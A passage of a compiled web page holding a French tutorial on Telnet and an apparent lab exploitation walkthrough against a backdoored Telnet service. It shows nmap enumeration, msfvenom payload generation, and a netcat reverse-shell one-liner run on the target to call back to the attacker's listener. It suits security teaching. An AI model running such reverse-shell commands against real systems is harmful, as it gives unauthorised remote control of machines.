import{_ as a,c as n,j as i,a as t,G as l,an as h,B as p,o as k}from"./chunks/framework.ys1W0Hiz.js";const C=JSON.parse('{"title":"Protocole Telnet","description":"","frontmatter":{"sidebar":"auto"},"headers":[],"relativePath":"cybersecurite/reseaux/telnet.md","filePath":"cybersecurite/reseaux/telnet.md","lastUpdated":1729429463000}'),r={name:"cybersecurite/reseaux/telnet.md"};function F(d,s,o,c,g,u){const e=p("Badge");return k(),n("div",null,[s[0]||(s[0]=i("h1",{id:"protocole-telnet",tabindex:"-1"},[t("Protocole Telnet "),i("a",{class:"header-anchor",href:"#protocole-telnet","aria-label":'Permalink to "Protocole Telnet"'},"​")],-1)),l(e,{type:"tip",text:"Rédigé le 21/04/2024"}),s[1]||(s[1]=h(`<h2 id="introduction-a-telnet" tabindex="-1">Introduction à Telnet <a class="header-anchor" href="#introduction-a-telnet" aria-label="Permalink to &quot;Introduction à Telnet&quot;">​</a></h2><p>Telnet est un protocole d&#39;application permettant de se connecter à une machine distante via un réseau. Il fonctionne sur la couche d&#39;application du modèle TCP/IP, facilitant la communication textuelle entre deux appareils.</p><h3 id="fonctionnement-de-telnet" tabindex="-1">Fonctionnement de Telnet <a class="header-anchor" href="#fonctionnement-de-telnet" aria-label="Permalink to &quot;Fonctionnement de Telnet&quot;">​</a></h3><ol><li><em><strong>Connexion Client-Serveur</strong></em>: Le client Telnet initie une connexion TCP avec le serveur Telnet. Cette connexion se fait généralement sur le port 23, le port par défaut pour Telnet.</li><li><em><strong>Poignée de main</strong></em>: Une fois la connexion établie, un processus de poignée de main se déroule entre le client et le serveur pour négocier divers paramètres, tels que le type de terminal, l&#39;ensemble de caractères et la vitesse du terminal.</li><li><em><strong>Session interactive</strong></em>: Après la poignée de main, le client présente à l&#39;utilisateur un invite de commande, transformant ainsi le client en un terminal virtuel. À partir de là, l&#39;utilisateur peut saisir des commandes et interagir avec le système distant comme s&#39;il était physiquement présent à sa console.</li><li><em><strong>Échange de données</strong></em>: Toutes les commandes saisies par l&#39;utilisateur à l&#39;invite de commande Telnet sont transmises sur le réseau au serveur Telnet. De même, toute sortie générée par le serveur en réponse à ces commandes est renvoyée au client pour affichage.</li></ol><h3 id="remarque-sur-la-securite-de-telnet" tabindex="-1">Remarque sur la sécurité de Telnet <a class="header-anchor" href="#remarque-sur-la-securite-de-telnet" aria-label="Permalink to &quot;Remarque sur la sécurité de Telnet&quot;">​</a></h3><p>Il est important de noter que Telnet présente des vulnérabilités de sécurité significatives. Il transmet toutes les données, y compris les mots de passe et autres informations sensibles, en texte clair, le rendant susceptible à l&#39;interception et à l&#39;écoute clandestine. En raison de ces risques de sécurité inhérents, Telnet a largement été remplacé par des alternatives plus sécurisées telles que SSH (Secure Shell) dans les implémentations modernes.</p><p>Pour se connecter à un serveur Telnet, on utilise généralement la syntaxe en ligne de commande : <code>telnet [nom d&#39;hôte ou adresse IP] [port]</code>. Par exemple, <code>telnet exemple.com 23</code> tenterait d&#39;établir une connexion Telnet à un serveur au nom d&#39;hôte spécifié (exemple.com) sur le port 23.</p><h2 id="enumeration" tabindex="-1">Énumération <a class="header-anchor" href="#enumeration" aria-label="Permalink to &quot;Énumération&quot;">​</a></h2><p>L&#39;énumération des clés peut être cruciale dans l&#39;exploitation d&#39;un service réseau mal configuré. Cependant, les vulnérabilités qui pourraient être potentiellement triviales à exploiter ne sautent pas toujours aux yeux. Pour cette raison, notamment en ce qui concerne l&#39;énumération des services réseau, on doit être méthodiques dans notre approche.</p><h3 id="exemple-avec-10-10-65-56" tabindex="-1">Exemple avec 10.10.65.56 <a class="header-anchor" href="#exemple-avec-10-10-65-56" aria-label="Permalink to &quot;Exemple avec 10.10.65.56&quot;">​</a></h3><p>On commence par énumérer les ports actifs :</p><div class="language-shell vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">shell</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">┌──(rootdev㉿kali</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">)-[~]</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">└─$</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> nmap</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -p-</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -v</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -A</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 10.10.65.56</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  </span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Starting</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> Nmap</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> 7.94SVN</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> ( </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">https://nmap.org</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> ) at 2024-04-22 00:04 CEST</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">[...]</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Scanning</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 10.10.65.56</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> [65535 </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">ports]</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Discovered</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> open</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> port</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> 8012/tcp</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> on</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 10.10.65.56</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Completed</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> Connect</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> Scan</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> at</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> 00:06,</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> 130.21s</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> elapsed</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> (65535 </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">total</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> ports</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">)</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Initiating</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> Service</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> scan</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> at</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> 00:06</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Scanning</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 1</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> service</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> on</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 10.10.65.56</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Completed</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> Service</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> scan</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> at</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> 00:09,</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> 157.57s</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> elapsed</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> (1 </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">service</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> on</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 1</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> host</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">)</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">NSE:</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> Script</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> scanning</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> 10.10.65.56.</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">[...]</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Not</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> shown:</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 65534</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> closed</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> tcp</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> ports</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> (conn-refused)</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">PORT</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">     STATE</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> SERVICE</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> VERSION</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">8012/tcp</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> open</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">  unknown</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">|</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> fingerprint-strings:</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> </span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">|</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">   DNSStatusRequestTCP,</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> DNSVersionBindReqTCP,</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> FourOhFourRequest,</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> GenericLines,</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> GetRequest,</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> HTTPOptions,</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> Help,</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> Kerberos,</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> LANDesk-RC,</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> LDAPBindReq,</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> LDAPSearchReq,</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> LPDString,</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> NCP,</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> NULL,</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> RPCCheck,</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> RTSPRequest,</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> SIPOptions,</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> SMBProgNeg,</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> SSLSessionReq,</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> TLSSessionReq,</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> TerminalServer,</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> TerminalServerCookie,</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> X11Probe:</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> </span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">|</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">_</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">    SKIDY&#39;S BACKDOOR. Type .HELP to view commands</span></span></code></pre></div><p>Si on avait scanner sans l&#39;option <code>-p-</code>, le port 8012 n&#39;aurait pas été trouvé car il n&#39;est pas considéré comme un port standard, ou du top 1000 des ports. On se rend compte ici de l&#39;importance de prendre le temps de tout scanner, cela permet d&#39;éviter de passer à côté de certaines vulnérabilités.</p><p>Dans les résultats de ce scan, on peut lire <code>SKIDY&#39;S BACKDOOR. Type .HELP to view commands</code>, ce qui signifie que ce port peut potentiellement être utilisé pour insérer une Backdoor.</p><h2 id="exploiter-telnet" tabindex="-1">Exploiter Telnet <a class="header-anchor" href="#exploiter-telnet" aria-label="Permalink to &quot;Exploiter Telnet&quot;">​</a></h2><p>Telnet, en tant que protocole, est intrinsèquement non sécurisé pour les raisons évoquées précédemment. Il manque de chiffrement, ce qui signifie que <em><strong>toutes les communications sont envoyées en texte clair</strong></em>, et pour la plupart, il présente de faibles contrôles d&#39;accès. Des CVE (Vulnérabilités et Expositions Communes) existent pour les systèmes clients et serveurs Telnet, ce qui permet de vérifier ces vulnérabilités sur des bases de données telles que :</p><p><a href="https://www.cvedetails.com/" target="_blank" rel="noreferrer">https://www.cvedetails.com/</a></p><p><a href="https://cve.mitre.org/" target="_blank" rel="noreferrer">https://cve.mitre.org/</a></p><p>Un CVE est une liste de failles de sécurité informatique publiquement divulguées. Lorsqu&#39;on fait référence à un CVE, on se réfère généralement au numéro d&#39;identification CVE attribué à une faille de sécurité.</p><p>Cependant, il est beaucoup plus probable de trouver une mauvaise configuration dans la façon dont Telnet a été configuré ou fonctionne, ce qui permettra à un attaquant de l&#39;exploiter.</p><h3 id="demontage-de-la-methode" tabindex="-1">Démontage de la méthode <a class="header-anchor" href="#demontage-de-la-methode" aria-label="Permalink to &quot;Démontage de la méthode&quot;">​</a></h3><p>Ainsi, à partir de l&#39;étape d&#39;énumération, il est connu que :</p><ol><li>Il y a un service Telnet mal dissimulé en cours d&#39;exécution sur cette machine.</li><li>Le service lui-même est marqué comme &quot;backdoor&quot;.</li><li>Il existe un nom d&#39;utilisateur possible &quot;Skidy&quot; impliqué.</li></ol><p>En utilisant ces informations, l&#39;attaquant peut essayer d&#39;accéder à ce port Telnet et d&#39;utiliser cela comme un point d&#39;appui pour obtenir un shell inversé complet sur la machine cible.</p><h4 id="connexion-a-telnet" tabindex="-1">Connexion à Telnet <a class="header-anchor" href="#connexion-a-telnet" aria-label="Permalink to &quot;Connexion à Telnet&quot;">​</a></h4><p>Il est possible de se connecter à un serveur Telnet avec la syntaxe suivante :</p><div class="language-shell vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">shell</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">telnet</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> [ip] [port]</span></span></code></pre></div><h3 id="qu-est-ce-qu-un-shell-inverse" tabindex="-1">Qu&#39;est-ce qu&#39;un Shell Inversé ? <a class="header-anchor" href="#qu-est-ce-qu-un-shell-inverse" aria-label="Permalink to &quot;Qu&#39;est-ce qu&#39;un Shell Inversé ?&quot;">​</a></h3><p>Un &quot;shell&quot; peut simplement être décrit comme un morceau de code ou un programme qui peut être utilisé pour obtenir l&#39;exécution de code ou de commandes sur un appareil.</p><p>Un shell inversé est un type de shell dans lequel la machine cible communique avec la machine attaquante.</p><p>La machine attaquante a un port d&#39;écoute, sur lequel elle reçoit la connexion, ce qui permet d&#39;atteindre l&#39;exécution de code ou de commandes.</p><h3 id="exploit" tabindex="-1">Exploit <a class="header-anchor" href="#exploit" aria-label="Permalink to &quot;Exploit&quot;">​</a></h3><p>Connexion en Telnet à la machine :</p><div class="language-shell vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">shell</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">┌──(rootdev㉿kali</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">)-[~]</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">└─$</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> telnet</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 10.10.65.56</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 8012</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Trying</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> 10.10.65.56...</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Connected</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> to</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> 10.10.65.56.</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Escape</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> character</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> is</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &#39;^]&#39;.</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">SKIDY</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">&#39;S BACKDOOR. Type .HELP to view commands</span></span></code></pre></div><p>Aucun retour sur les commandes, en revanche, lorsque l&#39;on écoute les ping, on se rend compte que notre machine attaquante communique bien avec l&#39;attaquée :</p><div class="language-shell vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">shell</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">┌──(rootdev㉿kali</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">)-[~]</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">└─$</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> tcpdump</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> ip</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> proto</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> \\\\</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">icmp</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -i</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> tun0</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">tcpdump:</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> verbose</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> output</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> suppressed,</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> use</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -v[v]...</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> for</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> full</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> protocol</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> decode</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">listening</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> on</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> tun0,</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> link-type</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> RAW</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> (Raw </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">IP</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">), snapshot length 262144 bytes</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">00:28:53.364751</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> IP</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 10.11.82.176</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> &gt;</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> 10.10.65.56:</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> ICMP</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> echo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> request,</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> id</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> 32639,</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> seq</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> 1,</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> length</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 64</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">00:28:53.412509</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> IP</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 10.10.65.56</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> &gt;</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> 10.11.82.176:</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> ICMP</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> echo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> reply,</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> id</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> 32639,</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> seq</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> 1,</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> length</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 64</span></span></code></pre></div><p>Grâce à cela, on peut envoyer un Reverse Shell avec <em><strong>msfvenom</strong></em> :</p><div class="language-shell vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">shell</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">┌──(rootdev㉿kali</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">)-[~/]</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">└─$</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> msfvenom</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -p</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> cmd/unix/reverse_netcat</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> lhost=</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">10.11.82.176</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> lport=</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">4444</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> R</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">[-] No arch selected, selecting arch: cmd from the payload</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">No</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> encoder</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> specified,</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> outputting</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> raw</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> payload</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Payload</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> size:</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 94</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> bytes</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">mkfifo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /tmp/vsnfs</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">; </span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">nc</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 10.11.82.176</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 4444</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 0</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">&lt;</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">/tmp/vsnfs</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> /bin/sh</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> &gt;</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">/tmp/vsnfs</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> 2&gt;&amp;1</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">; </span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">rm</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /tmp/vsnfs</span></span></code></pre></div><ul><li><em>-p = payload</em></li><li><em>lhost = our local host IP address (this is your machine&#39;s IP address)</em></li><li><em>lport = the port to listen on (this is the port on your machine)</em></li><li><em>R = export the payload in raw format</em></li></ul><p>Et celui-ci, on va l&#39;exécuter sur la machine attaquée après avoir écouté le port 4444 avec la commande <code>nc -lvp 4444</code></p><p>Sur le terminal Telnet, on exécute :</p><div class="language-shell vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">shell</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">.RUN</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> mkfifo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /tmp/vsnfs</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">; </span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">nc</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 10.11.82.176</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 4444</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 0</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">&lt;</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">/tmp/vsnfs</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> /bin/sh</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> &gt;</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">/tmp/vsnfs</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> 2&gt;&amp;1</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">; </span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">rm</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /tmp/vsnfs</span></span></code></pre></div><p>On se rend compte ainsi que sur le terminal où l&#39;on écoute le port 4444 que l&#39;on est connecté :</p><div class="language-shell vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">shell</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">┌──(laguigue㉿kali</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">)-[~]</span></span>
